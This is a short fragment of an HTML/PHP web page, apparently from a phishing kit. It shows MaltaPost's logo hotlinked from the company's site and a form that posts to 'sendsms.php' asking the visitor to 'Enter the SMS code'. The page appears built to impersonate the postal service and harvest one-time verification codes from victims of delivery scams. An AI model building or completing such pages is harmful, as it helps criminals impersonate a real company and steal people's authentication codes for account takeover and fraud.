...
<div id="authform">
    <div class="wrapper">
        <div class="scheme-logo-div"><img class="scheme-logo" alt="" src="https://www.maltapost.com/Tracking/Resources/images/subpage-header-logo_old.png"></div>
        ...
        <form id="form" name="form" method="post" action="sendsms.php">
            <dl style="margin-top: 10px;">
              ...
              <?php echo $date = date('m/d/Y h:i:s a', time());?> 
                ...
                <dt>
                    <label for="code">Enter the SMS code: </label>
                </dt>
                <dd>
